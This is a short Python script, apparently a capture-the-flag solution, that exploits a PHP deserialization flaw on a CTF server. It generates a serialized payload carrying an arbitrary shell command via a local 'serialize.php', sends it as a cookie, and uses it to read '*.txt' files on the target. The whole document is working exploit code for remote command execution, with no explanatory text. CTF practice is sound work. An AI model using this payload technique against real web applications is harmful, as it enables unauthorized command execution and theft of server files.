import requests
import subprocess
url = 'http://ctf.tcp1p.com:45678'
def exec_cmd(cmd): 

	payload = subprocess.check_output("php serialize.php "+cmd, shell=True, text=True)
	x = requests.get(url,cookies={'cookie':f'{payload}'})
	return x.text

if __name__ == '__main__':

	print(exec_cmd("'cat *.txt'").split("\n")[0])
